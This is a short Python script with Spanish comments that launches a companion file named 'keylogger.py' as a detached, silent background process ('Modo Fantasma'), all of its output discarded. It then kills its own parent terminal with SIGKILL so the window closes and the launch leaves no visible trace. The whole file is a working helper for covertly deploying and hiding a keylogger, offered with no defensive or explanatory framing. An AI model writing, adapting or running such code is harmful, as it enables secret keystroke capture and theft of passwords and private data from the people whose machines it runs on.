import subprocess
import os
import sys
import signal

def lanzar_y_desaparecer():
    # 1. Localizar el keylogger (asumiendo que está en la misma carpeta)
    script_dir = os.path.dirname(os.path.abspath(__file__))
    keylogger_path = os.path.join(script_dir, 'keylogger.py')

    if not os.path.exists(keylogger_path):
        print(f"Error: No encuentro '{keylogger_path}'")
        sys.exit(1)

    # 2. LANZAMIENTO SILENCIOSO (Modo Fantasma)
    # start_new_session=True: Crea un nuevo grupo de procesos. 
    # El keylogger ya no pertenece a esta terminal.
    subprocess.Popen(
        ['python3', keylogger_path],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True
    )

    # 3. AUTO-DESTRUCCIÓN DE LA TERMINAL
    # Obtenemos el ID del proceso Padre (la terminal/shell que estás usando)
    parent_pid = os.getppid()
    
    # Le enviamos la señal SIGKILL (Matar forzosamente) al padre.
    # Esto cerrará la ventana de la terminal instantáneamente.
    os.kill(parent_pid, signal.SIGKILL)

if __name__ == "__main__":
    lanzar_y_desaparecer()